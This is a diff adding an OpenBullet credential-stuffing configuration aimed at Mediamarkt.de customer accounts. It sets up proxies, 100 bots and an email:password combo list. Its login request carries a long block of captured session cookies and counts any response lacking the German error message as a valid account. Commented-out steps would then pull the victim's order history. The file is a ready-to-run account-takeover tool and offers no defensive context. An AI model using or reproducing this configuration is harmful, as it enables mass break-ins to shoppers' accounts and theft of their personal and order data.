@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-3e68c435240a0264ed2611474e8d4abc-LoliKEY",
+  "Name": "Mediamarkt.de",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-24T20:03:42.4380781+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Hyacintho",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.mediamarkt.de/webapp/wcs/stores/servlet/MultiChannelLogon" 
+  CONTENT "storeId=19501&langId=-3&rememberMe=true&redirectURL=https%3A%2F%2Fwww.mediamarkt.de%2F&logonId=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "testgroup=64.710; TS01254284=014cde72302871384602c22d5a8cc3807d91870b4d5c3f28cac2dc703ba2316a4755feae533a8dac997e2593e04035956948ea43932089ebf9f915ee78be68c1c5794b581b; MC_DEVICE_ID=-1; MC_DEVICE_ID_EXT=-1; TS0173859f=014cde7230407b644d37df7c8b06dbb110808290485c3f28cac2dc703ba2316a4755feae533b4e2306acf27829b078d78df5b4b1503db7a82ed0cb85737af04c77af303d2a9f78dfb6869d60df438ed5b968913834; TS01a7cfc6=014cde72300f64325d5a482691288401149c621b505c3f28cac2dc703ba2316a4755feae533b4e2306acf27829b078d78df5b4b150aac91f0d2abf3b80dbb76764e3eee6b52e11a8adb5d328d3ca5518cca9d17aa8; JSESSIONID=0000j0QAkJWR2NP44rgSihlhjJi: 18o069bhl; WC_SESSION_ESTABLISHED=true; WC_ACTIVEPOINTER=-3%2C19501; rxVisitor=1556127813787GMJLS84LBN0JNQD417EBG76IUV61JAUS; MC_PS_USER_ID=1556127811693-2452565; MC_PS_CHANNEL_ID=desktop; MC_USERTYPE=G; MC_PS_SESSION_ID=j0QAkJWR2NP44rgSihlhjJi; _dy_csc_ses=t; _dy_c_exps=; _gcl_au=1.1.783884623.1556127832; _dycnst=dg; _ga=GA1.2.1986664356.1556127833; _gid=GA1.2.8152273.1556127833; _dyid=4273916228319354966; _dyjsession=d864b9994cceba65fa723938a6649f3b; _dy_geo=DE.EU.DE_.DE__; _dy_df_geo=Germany..; MC_PRIVACY=marketing; fsd-exit-layer=0; _dy_c_att_exps=; za-box-protocol=https; TS01c09a37_77=08cdbc2170ab280043766be6f6a20f7fa30ab1b5b93545cdfd8daffb5c27116a97dc50830d5ad68c60d9a366c0ea4a5e08ce4b564d823800c135fce3c20c822931cb54036837eebcb0ba247476f473601d8e895217d0a08120270f17133b975c0eab7f996c2ad0f18587fb714fd23afc; WC_PERSISTENT=tQ4qCJdCtLZNWLCcX60EsLUuxwI%3D%0A%3B2019-04-24+19%3A44%3A21.682_1556127811693-2452565_19501_621478947%2C-3%2CEUR_19501; WC_AUTHENTICATION_621478947=621478947%2CZD00OlMybvwsb%2B6uZOhrk7SXvAE%3D; WC_USERACTIVITY_621478947=621478947%2C19501%2Cnull%2Cnull%2C1556127861684%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2CYyK8EeUQ6f3t9WBoyzpHEhui7h1nwQ50gM2RmOb4rpXuVz4REZ%2BnCtlFE7HSsUJAlAGBwCec5NhpCWJtMvljVScScKxfcInOxl%2FuXGFWKGGoRPyNQWY1sa3ajJDW0jYkRj2sqsMahfYuL%2FragtvBlLMYRFjlWroJ5YdfzmRNrLtRcpEzA4vDftp7%2FuUMa2eife8yH%2BAFyjqQn7ePC1yvI0L%2BacNLtQD3FPWHTozgOQs%3D; _dycst=dk.w.o.ms.; _dy_toffset=-3; _gat_UA-36693629-1=1; TS01c09a37=014cde7230fbdce3dc65a5ec3ebd8abb444e1d0fb40932e4ef32ec48616290db2a30260cd1cb62e97dc67e1eecbe87d14bc3ac024397c882ac95dcb0dd92246f982a74b86b5112c6970b627a157cc7cb44f563a83827ecee66716df6033aad7d680e14735a05e156fc3595e9a3f668027f4a974615d8a71f92bbe348310d838b6bb3ed18d808fb8efcb39be3767706ac2e49f9a2404c2d6b05c2bccf65adec4460a9117f4dd121641232866fc51ef40a993e0916c98394aa5575cee107ed9bc18b4326692b58f765adc7d5b494b55fc68696c5874d; _dy_ses_load_seq=60524%3A1556128292575; _dy_soct=380908.638569.1556127833*347790.567468.1556128292*334213.539376.1556128292; _dyfs=1556128294271; dtPC=9$328291650_111h-vJCCOAJLKGNMPDDFGNIPFABIMQEEEGGBA; rxvt=1556130102252|1556127813791; dtLatC=1; dtSa=true%7CC%7C-1%7CAnmelden%7C-%7C1556128323021%7C328291650_111%7Chttps%3A%2F%2Fwww.mediamarkt.de%2Fwebapp%2Fwcs%2Fstores%2Fservlet%2FLogonForm%3FcatalogId%3D13951%26langId%3D-3%26storeId%3D19501%26krypto%3DTwwES6ypaH7eKsx1d3II39fPs075aiF2iEgdrRHGge_252F2GjMl9PFpsvjUkRjLk21lxnb6eOxsX_252FlFo24g1csMJo8nttGerQgje3N4PhWnZT1u5I7qFl3pMTaxymFetYAxIFB_252B886RM9wLCiYt2hAtHKiSpPIxlcEP1dBcNQ3eopVWe6h3Eb4KvL3s8QvbCE1fINqcEuAYJwkzj22XfBEYp_252F8iAo_252FDIvVaGfQaJZcncO4COUgtCQVUnJFFG2vydse3P_252FdKGt7NL_252FWiMy8nnyPsyKVIIK4tRh49yDZGY_252FeezevprgU1QKBgDhdQjsU9HqdSm0cPeMxCgZCyWM2IahhenLvvssrqOGsVXKo0VEDJtmGehslITMLTqXiQAxo4U6lXg0upQWv6_252FY_252BU7R52UzRZ1gMrMwMsuSIJ7hiNSaDdDcu6P7tfMIAc9VOzlapeNFd_252B%7CLogin%20-%20Mein%20Kundenkonto%20-%20MediaMarkt%7C1556128302255%7C; dtCookie=9$87781CD27FC63203CAE280CCA4513002|17e1b57b5d95ef01|1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.mediamarkt.de" 
+  HEADER "Referer: https://www.mediamarkt.de/webapp/wcs/stores/servlet/LogonForm?redirectURL=https%3A%2F%2Fwww.mediamarkt.de%2F" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Ihre E-Mailadresse oder Passworteingabe war nicht korrekt, bitte wiederholen Sie Ihre Eingabe" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Ihre E-Mailadresse oder Passworteingabe war nicht korrekt, bitte wiederholen Sie Ihre Eingabe" 
+
+!#Order_Check REQUEST GET "https://www.mediamarkt.de/webapp/wcs/stores/servlet/MultiChannelMAMyOrders?period=&langId=-3&storeId=48353" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+!  HEADER "Referer: https://www.mediamarkt.de/" 
+
+!#PARSE_Order PARSE "<SOURCE>" LR "<div class=\"clearfix\"></div>" "<script type=\"text/javascript\">" -> CAP "Order" 
+
